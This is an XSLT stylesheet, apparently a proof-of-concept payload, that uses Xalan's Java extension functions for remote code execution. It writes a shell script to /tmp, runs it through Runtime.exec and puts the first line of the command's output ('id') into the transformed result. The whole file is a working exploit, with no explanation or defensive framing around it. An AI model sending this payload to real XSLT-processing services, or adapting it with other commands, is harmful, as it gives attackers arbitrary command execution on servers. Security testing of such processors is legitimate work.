<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  xmlns:fw="http://xml.apache.org/xalan/java/java.io.FileWriter"
  xmlns:proc="http://xml.apache.org/xalan/java/java.lang.Process"
  xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"
  xmlns:ir="http://xml.apache.org/xalan/java/java.io.InputStreamReader">
  <xsl:template match="/">
    <rce>
      <xsl:variable name="w" select="fw:new('/tmp/wm_rce.sh')"/>
      <xsl:value-of select="fw:write($w, '#!/bin/sh&#10;id&#10;')"/>
      <xsl:value-of select="fw:close($w)"/>
      <xsl:variable name="p" select="rt:exec(rt:getRuntime(), '/bin/sh /tmp/wm_rce.sh')"/>
      <xsl:variable name="in" select="proc:getInputStream($p)"/>
      <xsl:variable name="reader" select="br:new(ir:new($in))"/>
      <output><xsl:value-of select="br:readLine($reader)"/></output>
    </rce>
  </xsl:template>
</xsl:stylesheet>
